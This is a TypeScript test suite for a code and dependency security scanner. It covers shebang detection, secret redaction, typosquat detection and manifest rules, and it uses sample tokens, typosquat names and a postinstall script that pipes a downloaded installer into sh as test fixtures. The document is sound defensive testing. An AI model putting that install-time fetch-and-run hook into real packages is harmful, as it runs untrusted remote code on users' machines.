import { describe, expect, it } from 'vitest';
import {
  collectSuppressions,
  languageOf,
  languageOfShebang,
  meetsFailThreshold,
  scanText,
} from '../text';
import { detectTyposquat, editDistance, scanPackageJson, scanRequirementsTxt } from '../manifest-rules';
import { isKnownPlaceholder, redactSecret } from '../secret-rules';
import type { ScanFinding } from '../types';

describe('language detection', () => {
  it('maps extensions and treats dotted env files as config', () => {
    expect(languageOf('a.ts')).toBe('typescript');
    expect(languageOf('a.rb')).toBe('ruby');
    expect(languageOf('.env.production')).toBe('config');
    expect(languageOf('aws-credentials.env')).toBe('config');
  });
});

describe('shebang detection', () => {
  // An executable is named for the command it provides, not the language it is
  // written in. `debtap` is 3,500 lines of bash with no extension, and
  // extension-only detection scanned zero of them while reporting success.
  it('reads the interpreter from a shebang', () => {
    expect(languageOfShebang('#!/usr/bin/bash')).toBe('shell');
    expect(languageOfShebang('#!/bin/sh')).toBe('shell');
    expect(languageOfShebang('#!/usr/bin/env bash')).toBe('shell');
    expect(languageOfShebang('#!/usr/bin/env python3')).toBe('python');
    expect(languageOfShebang('#!/usr/bin/env node')).toBe('javascript');
    expect(languageOfShebang('#!/usr/bin/ruby')).toBe('ruby');
  });

  it('tolerates a version suffix and extra whitespace', () => {
    expect(languageOfShebang('#! /bin/bash')).toBe('shell');
    expect(languageOfShebang('#!/usr/bin/python3.11')).toBe('python');
  });

  it('reads interpreters passed through env split-string mode', () => {
    expect(languageOfShebang('#!/usr/bin/env -S node --experimental-strip-types')).toBe(
      'javascript',
    );
    expect(languageOfShebang('#!/usr/bin/env --split-string python3 -u')).toBe('python');
  });

  it('returns null for anything that is not a recognised interpreter', () => {
    expect(languageOfShebang('#!/usr/bin/env perl')).toBeNull();
    expect(languageOfShebang('# a comment, not a shebang')).toBeNull();
    expect(languageOfShebang('')).toBeNull();
    expect(languageOfShebang('\x7fELF\x02\x01')).toBeNull();
  });
});

describe('secret redaction', () => {
  it('never emits the matched credential', () => {
    const redacted = redactSecret('AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE');
    expect(redacted).not.toContain('AKIAIOSFODNN7EXAMPLE');
    expect(redacted).toContain('*');
  });

  it('is applied to findings, so a CI log never gains a secret', () => {
    const findings = scanText('a.env', 'GITHUB_TOKEN=ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
    expect(findings).toHaveLength(1);
    expect(findings[0]!.excerpt).not.toContain('ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
  });
});

describe('placeholders', () => {
  it('exempts documented placeholders', () => {
    expect(isKnownPlaceholder('YOUR_API_KEY')).toBe(true);
    expect(isKnownPlaceholder('changeme')).toBe(true);
  });

  it('does not exempt AWS documentation keys', () => {
    // They authenticate nothing, but they are in the file because someone
    // pasted a credentials template — and the remediation is the same one.
    expect(isKnownPlaceholder('AKIAIOSFODNN7EXAMPLE')).toBe(false);
    expect(scanText('a.env', 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE')).toHaveLength(1);
  });

  it('does not flag an ARN or a parameter-store path', () => {
    // Both sit under secret-shaped variable names in the testbed's control
    // group. Neither is a credential.
    expect(scanText('a.env', 'AWS_ROLE_ARN=arn:aws:iam::123456789012:role/app-runtime')).toHaveLength(0);
    expect(scanText('a.env', 'DATABASE_URL_SSM_PARAMETER=/prod/app/database-url')).toHaveLength(0);
  });

  it('flags a database URL only when it carries a password', () => {
    expect(scanText('a.env', 'DATABASE_URL=postgres://u:p@db.example.invalid:5432/app')).toHaveLength(1);
    expect(scanText('a.env', 'DATABASE_URL=postgres://db.example.invalid:5432/app')).toHaveLength(0);
  });

  // Eight of the ten `high` findings on a 500-star Go repository were this one
  // line, written in its README the way every driver documents a DSN.
  it('exempts the metasyntactic credential pair in a DSN', () => {
    expect(isKnownPlaceholder('postgres://user:pass@localhost/db')).toBe(true);
    expect(
      scanText('README.md', '  -c "postgres://user:password@localhost:5432/mydb?sslmode=disable"'),
    ).toHaveLength(0);
    expect(scanText('README.md', 'mysql://username:password@localhost/db')).toHaveLength(0);
    expect(scanText('docs/setup.md', 'redis://admin:secret@localhost:6379')).toHaveLength(0);
  });

  // The exemption is the pair, never the username alone, or a scanner would go
  // quiet on the most common real leak there is.
  it('still flags a real password beside a common username', () => {
    expect(scanText('a.env', 'DATABASE_URL=postgres://root:Xk9d2LmQpZ@db.internal/app')).toHaveLength(1);
    expect(scanText('a.env', 'DATABASE_URL=postgres://user:Xk9d2LmQpZ@db.internal/app')).toHaveLength(1);
    expect(scanText('a.env', 'DATABASE_URL=mongodb+srv://admin:s3cr3tP4ss@cluster.mongodb.net/db')).toHaveLength(1);
  });
});

describe('inline suppression', () => {
  it('suppresses the next line for a named rule', () => {
    const source = [
      '// threatcrush-disable-next-line secret-github-token  test fixture',
      "const t = 'ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';",
    ].join('\n');
    expect(scanText('a.js', source)).toHaveLength(0);
  });

  it('does not suppress a different rule', () => {
    const source = [
      '// threatcrush-disable-next-line sql-string-concatenation',
      "const t = 'ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';",
    ].join('\n');
    expect(scanText('a.js', source)).toHaveLength(1);
  });

  it('counts what it silenced, so a quiet scan is not mistaken for a clean one', () => {
    const lines = ['// threatcrush-disable-next-line secret-github-token', 'const t = 1;'];
    expect(collectSuppressions(lines).count).toBe(1);
  });
});

describe('--fail-on', () => {
  const at = (severity: ScanFinding['severity']): ScanFinding =>
    ({ severity }) as ScanFinding;

  it('fires at or above the requested floor', () => {
    expect(meetsFailThreshold([at('high')], ['critical', 'high'])).toBe(true);
    expect(meetsFailThreshold([at('critical')], ['high'])).toBe(true);
    expect(meetsFailThreshold([at('medium')], ['critical', 'high'])).toBe(false);
  });

  it('never fires when no threshold was requested', () => {
    expect(meetsFailThreshold([at('critical')], [])).toBe(false);
  });

  // Parsing the flag itself is the CLI's job and is tested there — see
  // apps/cli/src/commands/__tests__/scan.test.ts. This package has no opinion
  // about argv.
});

describe('typosquat detection', () => {
  it('counts a transposition as one edit', () => {
    expect(editDistance('lodahs', 'lodash')).toBe(1);
    expect(editDistance('reqeust', 'request')).toBe(1);
  });

  it('catches transpositions, deletions and separator tricks', () => {
    expect(detectTyposquat('lodahs', 'npm')?.impersonates).toBe('lodash');
    expect(detectTyposquat('expres', 'npm')?.impersonates).toBe('express');
    expect(detectTyposquat('urllib-3', 'pypi')?.impersonates).toBe('urllib3');
    expect(detectTyposquat('pythondateutil', 'pypi')?.impersonates).toBe('python-dateutil');
  });

  it('never flags the popular package itself', () => {
    expect(detectTyposquat('lodash', 'npm')).toBeNull();
    expect(detectTyposquat('requests', 'pypi')).toBeNull();
    expect(detectTyposquat('react-dom', 'npm')).toBeNull();
  });

  // The scope used to be stripped before the comparison, which reduced every
  // one of these to `core` and reported it as one edit from `cors`.
  it('does not reduce a scoped package to the part after the slash', () => {
    expect(detectTyposquat('@capacitor/core', 'npm')).toBeNull();
    expect(detectTyposquat('@babel/core', 'npm')).toBeNull();
    expect(detectTyposquat('@angular/core', 'npm')).toBeNull();
    expect(detectTyposquat('@nestjs/core', 'npm')).toBeNull();
    expect(detectTyposquat('@sentry/core', 'npm')).toBeNull();
  });

  it('leaves a scoped package alone even when the scope is unfamiliar', () => {
    // Ownership of the scope is what makes this safe: the package cannot be
    // reached by misreading an unscoped name.
    expect(detectTyposquat('@some-org/expres', 'npm')).toBeNull();
    expect(detectTyposquat('@types/node', 'npm')).toBeNull();
  });

  it('still catches an unscoped squat of the same name', () => {
    // The exemption is for scoped names only — it must not become a way to
    // smuggle the bare name past the check.
    expect(detectTyposquat('cores', 'npm')?.impersonates).toBe('cors');
  });
});

describe('manifest rules', () => {
  it('flags dependency confusion and a risky install-time lifecycle script', () => {
    const manifest = JSON.stringify(
      {
        dependencies: { '@profullstack-internal/auth-client': '0.0.0' },
        scripts: { postinstall: 'curl -fsSL https://example.invalid/install | sh' },
      },
      null,
      2,
    );
    const ids = scanPackageJson(manifest).map((f) => f.ruleId);
    expect(ids).toContain('manifest-dependency-confusion');
    expect(ids).toContain('manifest-risky-install-lifecycle-script');
  });

  it('does not flag an ordinary lifecycle build step', () => {
    const manifest = JSON.stringify({ scripts: { prepare: 'tsc -p tsconfig.json' } });
    expect(scanPackageJson(manifest)).toEqual([]);
  });

  it('reads requirements.txt and skips comments', () => {
    const text = ['# requests==2.32.3 --hash=sha256:00', 'reqeusts==0.0.0'].join('\n');
    const findings = scanRequirementsTxt(text);
    expect(findings).toHaveLength(1);
    expect(findings[0]!.line).toBe(2);
  });
});
